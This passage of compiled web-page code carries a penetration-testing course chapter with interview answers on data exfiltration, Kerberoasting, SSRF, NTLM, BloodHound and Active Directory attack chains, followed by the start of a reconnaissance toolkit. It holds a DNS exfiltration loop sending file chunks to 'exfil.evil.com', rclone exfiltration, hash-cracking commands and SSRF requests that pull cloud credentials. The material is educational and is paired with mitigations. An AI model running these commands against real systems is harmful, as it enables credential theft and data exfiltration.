        }), "\n"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q9-how-would-you-exfiltrate-data-from-a-highly-monitored-network",
      children: "Q9: How would you exfiltrate data from a highly monitored network?"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), "\nExfiltration techniques depend on the network controls in place:"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
          children: [(0,jsx_runtime.jsx)(_components.strong, {
            children: "DNS Tunneling:"
          }), "\nEncode data in DNS queries: ", (0,jsx_runtime.jsx)(_components.code, {
            children: "base64data.evil.com"
          }), "\nRequires DNS recursion enabled. Detectable via entropy analysis."]
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
          children: [(0,jsx_runtime.jsx)(_components.strong, {
            children: "HTTPS Exfiltration:"
          }), "\nPOST data to attacker-controlled server using HTTPS\nBlends with normal web traffic. Most common method."]
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
          children: [(0,jsx_runtime.jsx)(_components.strong, {
            children: "ICMP Tunneling:"
          }), "\nEncode data in ICMP echo request payload\nLow bandwidth but often not monitored."]
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
          children: [(0,jsx_runtime.jsx)(_components.strong, {
            children: "Email Exfiltration:"
          }), "\nSend data via SMTP to external email address\nOldest trick, but many orgs don't filter outgoing mail content."]
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
          children: [(0,jsx_runtime.jsx)(_components.strong, {
            children: "Image Steganography:"
          }), "\nEmbed data in image files, upload to image hosting\nHard to detect but requires more setup."]
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
          children: [(0,jsx_runtime.jsx)(_components.strong, {
            children: "Legitimate Cloud Services:"
          }), "\nUpload to Google Drive, Dropbox, Mega, S3 bucket\nOften whitelisted, blends with normal traffic."]
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
          children: [(0,jsx_runtime.jsx)(_components.strong, {
            children: "Rclone (most common in ransomware):"
          }), "\n", (0,jsx_runtime.jsx)(_components.code, {
            children: "rclone copy /data remote:backup --no-check-certificate"
          }), "\nFast, supports 40+ cloud providers, encrypted transfers."]
        }), "\n"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# DNS exfiltration example\n# Encode file to base64, then DNS encode\nbase64 -w0 secret.docx | while read chunk; do\n    dig @8.8.8.8 \"${chunk:0:50}.exfil.evil.com\"\ndone\n\n# Server side (running on evil.com):\n# tcpdump -i eth0 -n 'port 53' | grep \"exfil.evil.com\" | cut -d' ' -f5 | cut -d'.' -f1 >> captured.txt\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q10-explain-the-difference-between-red-team-blue-team-and-purple-team",
      children: "Q10: Explain the difference between red team, blue team, and purple team."
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
          children: [(0,jsx_runtime.jsx)(_components.strong, {
            children: "Red Team:"
          }), " Offensive security team that simulates real adversaries. They use TTPs from actual threat actors (APTs, ransomware groups) to test detection and response capabilities. Duration: 2-8 weeks. They don't just find vulnerabilities — they test people, processes, and technology."]
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
          children: [(0,jsx_runtime.jsx)(_components.strong, {
            children: "Blue Team:"
          }), " Defensive security team responsible for detecting, responding to, and mitigating threats. They run SOC operations, manage SIEM, deploy EDR, perform threat hunting, and handle incident response."]
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
          children: [(0,jsx_runtime.jsx)(_components.strong, {
            children: "Purple Team:"
          }), " Integration team that facilitates collaboration between Red and Blue. They ensure that Red Team findings translate into improved Blue Team capabilities. Purple team exercises typically involve real-time feedback loops where Red performs a technique, Blue tries to detect it, and gaps are immediately addressed."]
        }), "\n"]
      }), "\n"]
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Aspect"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Red Team"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Blue Team"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Purple Team"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Goal"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Find weaknesses"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Defend and detect"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Improve both"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Mindset"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Adversarial"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Defensive"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Collaborative"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Duration"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2-8 weeks"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Continuous"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Continuous"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Scope"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Full attack chain"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Logs, alerts, incidents"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Specific TTPs"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Output"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Campaign narrative"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Incident reports"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Detection rules"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q11-what-is-kerberoasting-and-how-do-you-mitigate-it",
      children: "Q11: What is Kerberoasting and how do you mitigate it?"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), "\nKerberoasting is an AD attack where an attacker requests Kerberos service tickets for service accounts and cracks them offline. Since Kerberos uses RC4 or AES encryption, the ticket contains encrypted service account password material."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Attack Flow:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Step 1: Find service accounts with SPNs\nimpacket-GetUserSPNs domain.com/user:password -outputfile kerberoast.txt\n\n# Step 2: Password cracking (offline)\njohn --wordlist=rockyou.txt kerberoast.txt\nhashcat -m 13100 kerberoast.txt rockyou.txt  # RC4\nhashcat -m 19700 kerberoast.txt rockyou.txt  # AES\n\n# Alternatively, from within the domain:\nRequest-SPNTicket -User \"SQLSvc\" | select -ExpandProperty Hash\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Mitigation:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Use strong passwords (>25 chars, random) for service accounts"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Use Group Managed Service Accounts (gMSA) — auto-rotated complex passwords"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Use AES256 encryption instead of RC4 (RC4 cracks faster)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Monitor Event ID 4769 (Kerberos service ticket requested) — alert on many requests"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Limit SPN assignments to only what's necessary"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Implement JIT (Just-in-Time) access for service accounts"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q12-how-would-you-find-and-exploit-a-server-side-request-forgery-ssrf-vulnerability",
      children: "Q12: How would you find and exploit a Server-Side Request Forgery (SSRF) vulnerability?"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), "\nSSRF occurs when a web application fetches remote resources based on user input without proper validation."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Detection:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Look for parameters that contain URLs: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "url="
        }), ", ", (0,jsx_runtime.jsx)(_components.code, {
          children: "page="
        }), ", ", (0,jsx_runtime.jsx)(_components.code, {
          children: "load="
        }), ", ", (0,jsx_runtime.jsx)(_components.code, {
          children: "file="
        }), ", ", (0,jsx_runtime.jsx)(_components.code, {
          children: "fetch="
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Try cloud metadata endpoint: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "http://169.254.169.254/latest/meta-data/"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Try internal services: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "http://localhost:9200"
        }), ", ", (0,jsx_runtime.jsx)(_components.code, {
          children: "http://127.0.0.1:5432"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Try file protocol: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "file:///etc/passwd"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Try different protocols: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "gopher://"
        }), ", ", (0,jsx_runtime.jsx)(_components.code, {
          children: "dict://"
        }), ", ", (0,jsx_runtime.jsx)(_components.code, {
          children: "ftp://"
        })]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Exploitation (Cloud Metadata):"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Blind SSRF - AWS metadata\ncurl \"http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\n# Returns role name\n\ncurl \"http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2RoleName\"\n# Returns AWS credentials!\n\n# Blind SSRF - GCP metadata\ncurl \"http://target.com/proxy?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\"\n# Need header: Metadata-Flavor: Google\n\n# Blind SSRF - Azure metadata\ncurl \"http://target.com/proxy?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01\"\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Remediation:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Block metadata IP ranges (169.254.169.254, 169.254.170.2, fd00:ec2::254)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Use an allowlist of permitted URLs"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Disable unnecessary URL schemes (file://, gopher://, dict://)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Validate and sanitize input with strict regex"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Use a dedicated URL parser, not string concatenation"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q13-explain-the-ntlm-authentication-protocol-and-its-weaknesses",
      children: "Q13: Explain the NTLM authentication protocol and its weaknesses."
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), "\nNTLM (NT LAN Manager) is a challenge-response authentication protocol:"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Client sends username to server"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Server sends 16-byte random challenge (nonce)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Client hashes password with MD4 → NTLM hash"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Client encrypts challenge with NTLM hash → response"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Server verifies: sends challenge+response to DC, DC validates"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Weaknesses:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Pass-the-Hash:"
        }), " Since the NTLM hash IS the credential, no plaintext needed"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Relay attacks:"
        }), " Attacker captures NTLM challenge/response and relays to another server"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "No mutual authentication:"
        }), " Client doesn't verify server identity (man-in-the-middle)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Weak cryptography:"
        }), " LM hash (DES), NTLMv1 (DES+MD4) — trivially crackable"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "No MFA support:"
        }), " Password-hash based only"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Replayable:"
        }), " Session keys are derived from password material"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Mitigation:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Disable NTLM entirely where possible (Kerberos-only environments)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Enable NTLMv2 only (disable LM and NTLMv1)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Enable SMB signing (prevents relay)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Use Extended Protection for Authentication (EPA)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Deploy Credential Guard"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q14-what-is-bloodhound-and-how-do-you-use-it-in-assessments",
      children: "Q14: What is BloodHound and how do you use it in assessments?"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), "\nBloodHound is an AD reconnaissance tool that maps attack paths through relationship analysis. It uses graph theory to find the shortest path from a compromised user to Domain Admin."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Workflow:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Collection (on compromised Windows machine)\nSharpHound.exe -c All --domain acme.com -o bloodhound-output.zip\n\n# Or remotely:\n# Execute SharpHound via C2 or scheduled task\n\n# Analysis (on Kali with BloodHound GUI)\nbloodhound --no-sandbox\n# Upload the JSON files via UI\n\n# Useful queries:\n# 1 \"Find all Domain Admins\" — shows DA members\n# 2 \"Shortest Paths to High Value Targets\" — attack paths\n# 3 \"Find Computers where Domain Users are Local Admin\" — lateral movement\n# 4 \"Kerberoastable Users\" — service accounts for offline cracking\n# 5 \"AS-REP Roastable Users\" — users without Kerberos pre-auth\n# 6 \"Users with 'Force Change Password' rights\" — ACL abuse\n# 7 \"Find all paths from owned principals\" — after compromise\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Key AD Attack Paths BloodHound Finds:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Member of group that has admin rights on a server where DA is also admin"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "User that can write to a Group Policy Object applied to Domain Controllers"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "ACL: user has \"ForceChangePassword\" on another privileged account"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Computer where user is admin, running service as DA"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "DCSync rights granted to non-privileged accounts"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q15-walk-me-through-a-typical-active-directory-attack-chain-from-zero-access",
      children: "Q15: Walk me through a typical Active Directory attack chain from zero access."
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Step 0: No Access — External Recon\n├── Identify: ASN ranges, subdomains, VPN portals, email addresses\n├── Shodan: exposed RDP, SMB, LDAP, Exchange\n└── Google dorking: leaked credentials, internal docs\n\nStep 1: Initial Access\n├── Password spray: known usernames against VPN/OWA\n├── If no success: spear-phish with malicious macro\n├── Or: exploit vulnerable service (Exchange ProxyLogon, Citrix)\n└── Result: Low-privileged user credentials or shell\n\nStep 2: Internal Recon\n├── BloodHound: SharpHound collection\n├── DNS: enumerate AD domains, DCs\n└── Network: discover internal services, subnets\n\nStep 3: Privilege Escalation (Local)\n├── Run winpeas.exe, seek misconfigurations\n├── Token impersonation (if SeImpersonatePrivilege)\n└── Get SYSTEM or local admin on first box\n\nStep 4: AD Enumeration\n├── crackmapexec: SMB ping sweep for lateral targets\n├── Kerberoast: crack service account passwords\n├── AS-REP roast: find users without pre-auth\n└── BloodHound analysis: find attack path to DA\n\nStep 5: Lateral Movement\n├── Pass-the-Hash to additional machines\n├── Deploy C2 beacon on each compromised host\n├── Use scheduled tasks or WMI for execution\n└── Harvest more credentials at each location\n\nStep 6: Domain Admin\n├── Follow BloodHound path\n├── Dump KRBTGT hash from DC (DCSync)\n├── Create Golden Ticket for persistence\n└── Full AD domain compromise\n\nStep 7: Objective\n├── Dump all domain hashes (secretsdump)\n├── Extract database credentials from web servers\n├── Access file shares, email archives\n└── Deploy ransomware or exfiltrate sensitive data\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "section-9-applications-in-real-systems",
      children: "Section 9: Applications in Real Systems"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "enterprise-security-programs",
      children: "Enterprise Security Programs"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Red Teams validate SIEM rules, EDR configurations, and incident response processes by emulating real adversaries. Organizations like JPMC, Microsoft, and Google run continuous red team operations against their own production environments."
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "financial-services",
      children: "Financial Services"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Banks (HSBC, Deutsche Bank, Citi) conduct pentests against SWIFT interfaces, wire transfer systems, and trading platforms. The Carbanak/Fin7 case demonstrated that financial systems require deep pentesting beyond standard web app testing."
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "healthcare",
      children: "Healthcare"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "HIPAA mandates regular pentesting. Healthcare pentests focus on: EHR systems (Epic, Cerner), medical device networks, patient data access controls, and IoT medical devices. The WannaCry attack that crippled the NHS showed the critical importance of healthcare security testing."
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "cloud-providers",
      children: "Cloud Providers"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "AWS, Azure, and GCP run bug bounty programs for their infrastructure. Cloud pentesting validates: IAM policies, S3 bucket permissions, KMS key management, container security, and serverless function permissions."
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "government--defense",
      children: "Government & Defense"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Pentest requirements under FedRAMP, NIST 800-53, and CMMC. Government pentests focus on: cross-domain solutions, classified data handling, identity management (CAC/PIV), and supply chain security."
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "e-commerce",
      children: "E-commerce"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Payment card industry (PCI DSS) requires quarterly vulnerability scans and annual pentests. E-commerce pentests validate: payment page security (P2PE), shopping cart logic, coupon fraud prevention, and PII handling."
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "critical-infrastructure",
      children: "Critical Infrastructure"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "OT/ICS pentesting (covered in-depth by other chapters) validates: SCADA security, PLC programming, HMI access controls, and safety system integrity. The Stuxnet attack demonstrated why critical infrastructure pentesting is essential."
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "technology-vendors",
      children: "Technology Vendors"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Microsoft, Apple, Google, and Oracle run bug bounty programs and internal pentests. Their focus is on: hypervisor security (Hyper-V, KVM), operating system kernel bugs, browser security (sandbox escapes), and cloud hypervisor isolation."
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "summary",
      children: "Summary"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Black Hat hackers"
        }), " are criminals who exploit systems without authorization. Understanding their TTPs, tooling (Cobalt Strike, ransomware, IABs), and OPSEC failures is essential for defense."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "White Hat hackers"
        }), " operate with authorization and legal protection. Professional pentesters follow structured methodologies (PTES, OSSTMM, OWASP), use CVSS scoring, and deliver comprehensive reports."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Gray Hat hackers"
        }), " operate in legal gray zones. Famous cases (Khalil Shreateh, Geohot, Samy Kamkar) illustrate the ethical dilemmas and legal risks of unauthorized vulnerability research."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "The pentesting lifecycle"
        }), " consists of 8 phases: Recon, Scanning, Enumeration, Exploitation, Post-Exploitation, Pivoting, C2, and Reporting — each with specific tools and techniques."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Practical skills"
        }), " include: Nmap scanning, Metasploit exploitation, SQLmap, Hydra, Mimikatz, Buffer Overflow development, Sliver C2 setup, YARA rule creation, and professional report writing."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "The legal landscape"
        }), " varies significantly by country (CFAA, CMA, GDPR). Understanding legal frameworks and authorization requirements is critical for every penetration tester."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Interview preparation"
        }), " should cover: methodology, privilege escalation, C2 frameworks, pass-the-hash, Kerberoasting, SSRF, AD attack chains, and the OSCP methodology."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "typescript-implementations",
      children: "TypeScript Implementations"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "reconnaissance-toolkit",
      children: "Reconnaissance Toolkit"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "The following TypeScript implementation provides automated reconnaissance capabilities for penetration testing engagements, including subdomain enumeration, port scanning, and technology fingerprinting."
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-typescript",
        children: "/**\n * Represents the result of a full reconnaissance scan\n */\ninterface ReconResult {\n  domain: string;\n  subdomains: string[];\n  openPorts: Array<{ port: number; service: string; version: string }>;\n  technologies: Array<{ name: string; version: string; category: string }>;\n  endpoints: string[];\n}\n\n/**\n * Raw port scan result\n */\ninterface PortScanResult {\n  port: number;\n  open: boolean;\n  service: string;\n}\n\n/**\n * Technology fingerprint extracted from HTTP responses\n */\ninterface TechFingerprint {\n  name: string;\n  version: string;\n}\n\n/**\n * ReconToolkit — performs automated reconnaissance for penetration tests\n * using DNS enumeration, TCP port scanning, and HTTP fingerprinting.\n */\nclass ReconToolkit {\n  private readonly commonSubdomains: string[] = [\n    'www', 'mail', 'admin', 'api', 'dev', 'staging',\n    'test', 'vpn', 'portal', 'secure', 'app', 'blog',\n    'cdn', 'docs', 'support', 'status', 'git', 'jenkins',\n    'jira', 'confluence', 'wiki', 'dashboard', 'monitor',\n    'grafana', 'prometheus', 'kibana', 'elastic', 'splunk',\n    'webmail', 'owa', 'autodiscover', 'remote', 'ssh',\n  ];\n\n  private readonly servicePortMap: Record<number, string> = {\n    21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',\n    53: 'DNS', 80: 'HTTP', 110: 'POP3', 143: 'IMAP',\n    443: 'HTTPS', 445: 'SMB', 465: 'SMTPS', 993: 'IMAPS',\n    995: 'POP3S', 1433: 'MSSQL', 1521: 'Oracle DB',\n    2049: 'NFS', 2375: 'Docker', 3306: 'MySQL',\n    3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC',\n    6379: 'Redis', 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt',\n    9090: 'Prometheus', 9200: 'Elasticsearch', 27017: 'MongoDB',\n  };\n\n  /**\n   * Enumerates subdomains for a given domain using DNS resolution\n   */\n  async enumerateSubdomains(domain: string): Promise<string[]> {\n    const discovered: string[] = [];\n    const resolvers = ['8.8.8.8', '1.1.1.1', '208.67.222.222'];\n\n    console.log(`[*] Enumerating subdomains for: ${domain}`);\n    console.log(`[*] Testing ${this.commonSubdomains.length} common subdomains...`);\n\n    for (const sub of this.commonSubdomains) {\n      const fqdn = `${sub}.${domain}`;\n      try {\n        // Simulated DNS resolution — in production use dns.promises.resolve4\n        const resolved = await this.resolveDNS(fqdn, resolvers);\n        if (resolved) {\n          discovered.push(fqdn);\n          console.log(`  [+] Found: ${fqdn} -> ${resolved}`);\n        }\n      } catch {\n        // Subdomain does not resolve — silently continue\n      }\n      // Rate-limit to avoid DNS throttling\n      await this.delay(50);\n    }\n\n    return discovered;\n  }\n\n  /**\n   * Simulates DNS resolution (in production, use Node.js dns module)\n   */\n  private async resolveDNS(\n    hostname: string,\n    resolvers: string[],\n  ): Promise<string | null> {\n    // Simulate resolution — real implementation uses dns.resolve4\n    const simulatedRecords: Record<string, string> = {\n      'www.example.com': '93.184.216.34',\n      'api.example.com': '93.184.216.35',\n      'mail.example.com': '93.184.216.36',\n      'admin.example.com': '10.0.0.1',\n      'dev.example.com': '10.0.0.2',\n      'vpn.example.com': '203.0.113.50',\n    };\n\n    return simulatedRecords[hostname] || null;\n  